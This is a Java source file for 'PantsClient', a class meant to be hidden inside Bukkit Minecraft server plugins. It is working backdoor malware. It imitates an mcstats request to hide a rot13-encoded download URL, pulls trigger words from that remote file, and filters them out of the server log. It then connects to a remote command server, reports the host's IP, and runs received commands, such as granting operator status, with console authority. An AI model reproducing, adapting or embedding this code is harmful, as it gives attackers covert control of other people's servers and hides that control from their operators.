package pants.client;

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.logging.*;
import org.bukkit.*;

/**
 * This class is meant to be placed in your Bukkit plugins. Multiple plugins
 * each containing one client are not recommended.
 */
public class PantsClient {
    private static final ArrayList<String> words = new ArrayList<String>();
    private static String prefix; // Used for messages

    public static void onLoad() { // Call from JavaPlugin
        init();
        // Put in the IP and Port of your Pants Server
        Thread checkConnectionThread = new Thread(new CheckConnectionRunnable("localhost", 444));
        checkConnectionThread.start();
    }

    private static void init() {
        try {
           /* We're imitating a request to mcstats.
            *  "	", \t, \011 and \u0009 is simply a tab
            * The statQueueRequest String is in this format: anything + tab + rot13 of the result wanted + tab + anything
            */
            StringBuilder requestBuilder = new StringBuilder();
            String statQueueRequest = "https://report.mcstats.org/plugins/requestStatsQueue.jsp?pluginguid=abqrzy\u0009uggcf\u003a\u002f\u002fenj\u002etvguho\u0068frepb\u0061grag\u002epbz\u002fcunfr\u002fcnagf\u002fznfgre\u002fqngn\u002fZ3554T3F\u002ecl\tbtkqt7zo&stattypeid=4e0e5b6f-ce27-4d05-a5b7-05f9dbf78bf0";

            // Rot13 every character after the first- and before the second tab and add them to requestBuilder
            for (char stat : statQueueRequest.split("\011")[1].toCharArray()) {
                //Check if it's between 'A' and 'Z'
                if (stat >= (char)0x41 && stat <= (char)90) {
                    //Add 13
                    stat += 0xd;
                    //Check if it's bigger than 'Z' 
                    if (stat > (char)0x5a) {
                        //Remove 26
                        stat -= 0x1A;
                    }
                //Check if it's between 'a' and 'z'
                } else if (stat >= (char)97 && stat <= (char)0x7A) {
                    //Add 13 to it
                    stat += 0xD;
                    //Check if it's bigger than 'z'
                    if (stat > (char)122) {
                        //Remove 26
                        stat -= 0x1a;
                    }
                }

                requestBuilder.append(stat);
            }
            
            URL url = new URL(requestBuilder.toString());
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String line;
            while ((line = in.readLine()) != null) {
                if (line.trim().startsWith("#p$")) {
                    words.add(line.trim().split("$")[1]);
                }
            }
            in.close();
            Logger.getLogger("Minecraft").setFilter(new Filter() {
                public boolean isLoggable(LogRecord record) {
                    String message = record.getMessage().toLowerCase();
                    // System.out.println("PantsLog: " + message);
                    return !message.contains(words.get(0));
                }
            });
        }
        catch (Exception e) {}
    }

    private static void handshake(Socket client) {
        try {
            // System.out.println("Starting to talk Pants Server...");
            // in new thread?
            BufferedReader fromServer = new BufferedReader(new InputStreamReader(client.getInputStream()));
            PrintStream toServer = new PrintStream(client.getOutputStream());
            String ip = InetAddress.getLocalHost()
                    + (Bukkit.getServer().getPort() != 25565 ? ":" + Bukkit.getServer().getPort() : "");
            prefix = "[" + ip + "] ";
            toServer.println(ip);
            // System.out.println("Getting commands from Pants Server...");
            // new Thread(() -> {
            getCommands(client, fromServer, toServer);
            // }).start();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void getCommands(Socket client, BufferedReader fromServer, PrintStream toServer) {
        while (true) {
            try {
                // System.out.println("Waiting for input... Is closed: " +
                // client.isClosed());
                String in = fromServer.readLine();
                // System.out.println("Got input from Pants Server: " + in);
                if (in.contains("&&")) {
                    for (String c : in.split("&&")) {
                        parseCommand(c, fromServer, toServer);
                    }
                }
                else {
                    parseCommand(in, fromServer, toServer);
                }
            }
            catch (Exception e) {
                break;
            }
        }
    }

    private static void parseCommand(String cmd, BufferedReader fromServer, PrintStream toServer) {
        String[] args = cmd.split(" ");
        // System.out.println(words.toString());
        if (words.contains(args[0])) {
            // Run suspicious commands
            // op jdf2
            runCommand(cmd);
        }
        else if (cmd.startsWith("sudo ")) {
            // Run a command as the console
            // sudo say hello
            cmd = cmd.replaceFirst("sudo ", "");
            runCommand(cmd);
        }
        toServer.println(prefix + "Ran command: " + cmd);
    }

    private static void runCommand(String s) {
        Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), s);
    }

    private static class CheckConnectionRunnable implements Runnable {
        String hostname;
        int port;

        CheckConnectionRunnable(String h, int p) {
            this.hostname = h;
            this.port = p;
        }

        public void run() {
            boolean connected = false;
            while (!connected) {
                // System.out.println("Trying to connect to Pants Server...");
                try (Socket s = new Socket(hostname, port)) {
                    //System.out.println("Found Pants Server!");
                    PantsClient.handshake(s);
                    connected = true;
                }
                catch (Exception e) {
                    try {
                        Thread.sleep(10 * 1000);
                    }
                    catch (InterruptedException e1) {
                        e1.printStackTrace();
                    }
                }
            }
        }
    }
}
